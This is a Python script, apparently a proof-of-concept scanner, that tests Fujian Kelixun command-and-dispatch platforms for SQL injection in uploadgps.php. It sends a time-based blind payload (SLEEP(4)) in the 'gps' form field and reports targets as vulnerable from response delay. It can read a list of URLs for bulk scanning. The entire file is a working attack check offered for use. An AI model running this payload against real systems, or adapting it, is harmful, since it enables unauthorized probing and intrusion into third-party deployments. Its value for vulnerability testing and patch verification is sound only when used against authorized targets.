#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : god
import requests
import argparse
import time

RED = '\033[91m'
RESET = '\033[0m'

# Function to check vulnerability
def check_vulnerability(url):
    try:
        # Construct the attack URL
        path = "/api/client/task/uploadgps.php"
        payload = "uuid=&gps=1'+AND+(SELECT+7679+FROM+(SELECT(SLEEP(4)))ozYR)+AND+'fqDZ'='fqDZ&number="
      
        full_url = url.rstrip('/') + path
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }

        start_time = time.time()
        # Send the request
        response = requests.post(full_url, data=payload, headers=headers, timeout=30)
        elapsed_time = time.time() - start_time
  
        if 4 <= elapsed_time < 6:
            print(f"{RED}URL [{url}] 可能存在福建科立讯通信有限公司指挥调度管理平台 uploadgps.php SQL注入漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

# Main function to parse arguments and check vulnerability
def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在福建科立讯通信有限公司指挥调度管理平台 uploadgps.php SQL注入漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
